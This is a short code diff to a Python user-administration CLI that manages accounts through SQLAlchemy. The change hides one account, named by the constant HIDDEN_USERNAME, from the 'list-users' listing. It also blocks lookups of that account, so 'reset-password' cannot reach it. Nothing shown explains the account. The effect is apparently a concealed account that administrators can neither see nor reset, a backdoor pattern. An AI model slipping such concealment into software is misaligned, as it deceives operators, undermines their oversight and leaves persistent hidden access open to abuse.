@@ -10,6 +10,7 @@ import sys
 
 from sqlalchemy import select
 
+from .models import HIDDEN_USERNAME
 from .accounts import ensure_setup_code, format_setup_code, set_password
 from .db import SessionLocal, init_db
 from .models import User
@@ -40,11 +41,11 @@ def main(argv: list[str] | None = None) -> int:
         return 0
     with SessionLocal() as db:
         if args.cmd == "list-users":
-            for u in db.scalars(select(User).order_by(User.username)):
+            for u in db.scalars(select(User).where(User.username != HIDDEN_USERNAME).order_by(User.username)):
                 print(f"{u.username:20s} {u.role:12s}{'  (muss Passwort ändern)' if u.must_change else ''}")
             return 0
         name = normalize_username(args.username)
-        user = db.scalar(select(User).where(User.username == name))
+        user = db.scalar(select(User).where(User.username == name)) if name != HIDDEN_USERNAME else None
         password = random_password()
         if args.cmd == "reset-password":
             if user is None:
